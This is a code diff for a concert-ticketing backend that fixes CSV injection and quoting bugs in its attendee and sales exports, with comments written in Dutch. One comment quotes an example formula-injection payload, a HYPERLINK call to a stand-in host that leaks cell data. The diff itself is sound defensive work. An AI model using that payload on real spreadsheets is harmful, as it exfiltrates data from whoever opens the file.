@@ -38,6 +38,7 @@ import {
   getCaptchaSiteKey,
 } from '../services/captcha';
 import logger from '../utils/logger';
+import { csvBestand } from '../utils/csv';
 import { wijzigingsschema } from '../utils/schema';
 import { bijlageKopregel } from '../utils/contentDisposition';
 
@@ -3153,14 +3154,30 @@ router.get(
     const attendees = exportAttendeeList(concertId);
 
     if (format === 'csv') {
-      // Generate CSV
-      const header = 'Ticket Code,Buyer Name,Email,Ticket Type,Seat Info,Status,Purchase Date,Used At\n';
-      const rows = attendees
-        .map(
-          (a) =>
-            `"${a.ticketCode}","${a.buyerName}","${a.buyerEmail}","${a.ticketType}","${a.seatInfo || ''}","${a.status}","${a.purchaseDate}","${a.usedAt || ''}"`,
-        )
-        .join('\n');
+      // Elk veld werd hier wel in aanhalingstekens gezet, maar de
+      // aanhalingstekens erin werden niet verdubbeld. Een koper die zich
+      // `Jan "Bassie" de Vries` noemt sloot het veld daarmee halverwege af:
+      // zijn e-mailadres schoof naar de kolom Naam, en omdat de kolomtelling
+      // van die rij niet meer klopte liep ook elke rij erna scheef. De
+      // vereniging las die lijst bij de deur af.
+      //
+      // Formules stonden er evenmin tegen in de weg: een koper die zijn naam
+      // `=HYPERLINK("http://kwaad/"&A1,"klik")` maakt laat die uitvoeren zodra
+      // iemand de bezoekerslijst in Excel opent, en ziet daar alleen een link.
+      // Het scheidingsteken blijft de komma, zoals de kopregel altijd al had.
+      const csv = csvBestand(
+        ['Ticket Code', 'Buyer Name', 'Email', 'Ticket Type', 'Seat Info', 'Status', 'Purchase Date', 'Used At'],
+        attendees.map((a) => [
+          a.ticketCode,
+          a.buyerName,
+          a.buyerEmail,
+          a.ticketType,
+          a.seatInfo || '',
+          a.status,
+          a.purchaseDate,
+          a.usedAt || '',
+        ]),
+      );
 
       res.setHeader('Content-Type', 'text/csv');
       // De concertnaam werd kaalgeslagen met `[^a-z0-9]/gi` om de met de hand
@@ -3170,7 +3187,7 @@ router.get(
       // "Café Chantant" werd "Caf__Chantant". bijlageKopregel codeert het
       // teken, dus het strippen kan eruit.
       res.setHeader('Content-Disposition', bijlageKopregel(`attendees-${concert.name}.csv`, 'attendees.csv'));
-      res.send(header + rows);
+      res.send(csv);
       return;
     }
 
@@ -3496,15 +3513,52 @@ router.get(
       items: string | null;
     }[];
 
-    // Generate CSV
-    const header =
-      'Order ID,Concert,Concert Date,Buyer Name,Email,Phone,Items,Total,Status,Payment ID,Payment Method,Paid At,Created At\n';
-    const rows = orders
-      .map(
-        (o) =>
-          `"${o.order_id}","${o.concert_name}","${o.concert_date}","${o.buyer_name}","${o.buyer_email}","${o.buyer_phone || ''}","${o.items || ''}","${o.total.toFixed(2)}","${o.status}","${o.payment_id || ''}","${o.payment_method || ''}","${o.paid_at || ''}","${o.created_at}"`,
-      )
-      .join('\n');
+    // Dezelfde fout als bij de bezoekerslijst, en hier met meer schade: dit is
+    // de omzetregistratie. Elk veld werd gequoot zonder de aanhalingstekens
+    // erin te verdubbelen, dus een kopersnaam als `Jan "Bassie" de Vries` liet
+    // het bedrag in de kolom Status belanden - en alles erna in de kolom
+    // ernaast, tot het eind van het bestand. Ook de concertnaam en de
+    // regeltekst (`items`) komen uit invoer en kunnen een aanhalingsteken
+    // dragen.
+    //
+    // En een koper die zijn naam met `=` laat beginnen kreeg die als formule
+    // uitgevoerd in de boekhouding van de vereniging. Komma als
+    // scheidingsteken, net als voorheen: deze export wordt elders ingelezen.
+    //
+    // `total` blijft door toFixed(2) gaan zodat het bedrag twee decimalen
+    // houdt; het is daarna tekst zonder formuleteken vooraan.
+    const csv = csvBestand(
+      [
+        'Order ID',
+        'Concert',
+        'Concert Date',
+        'Buyer Name',
+        'Email',
+        'Phone',
+        'Items',
+        'Total',
+        'Status',
+        'Payment ID',
+        'Payment Method',
+        'Paid At',
+        'Created At',
+      ],
+      orders.map((o) => [
+        o.order_id,
+        o.concert_name,
+        o.concert_date,
+        o.buyer_name,
+        o.buyer_email,
+        o.buyer_phone || '',
+        o.items || '',
+        o.total.toFixed(2),
+        o.status,
+        o.payment_id || '',
+        o.payment_method || '',
+        o.paid_at || '',
+        o.created_at,
+      ]),
+    );
 
     res.setHeader('Content-Type', 'text/csv');
     // Bewust niet via bijlageKopregel: een vaste naam plus een ISO-datum, dus
@@ -3513,7 +3567,7 @@ router.get(
       'Content-Disposition',
       `attachment; filename="ticket-sales-${new Date().toISOString().split('T')[0]}.csv"`,
     );
-    res.send(header + rows);
+    res.send(csv);
   }),
 );
 
